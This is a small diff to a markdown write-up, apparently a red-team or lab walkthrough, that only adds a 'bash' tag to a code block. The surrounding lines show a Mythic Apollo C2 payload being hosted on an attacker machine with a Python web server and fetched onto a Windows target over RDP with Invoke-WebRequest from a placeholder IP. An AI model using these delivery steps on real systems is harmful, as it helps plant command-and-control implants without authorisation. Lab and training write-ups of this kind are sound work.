@@ -96,7 +96,7 @@ A Mythic Apollo payload was generated and delivered to the Windows machine using
 #on mythic hosted ubuntu
 python3 -m http.server 9999
 ```
-```
+```bash
 #on rdp windows
 Invoke-WebRequest -Uri http://x.x.x.x:9999/payload-name.exe -OutFile "C:\user\public\downloads\payload-name.exe"
 ```
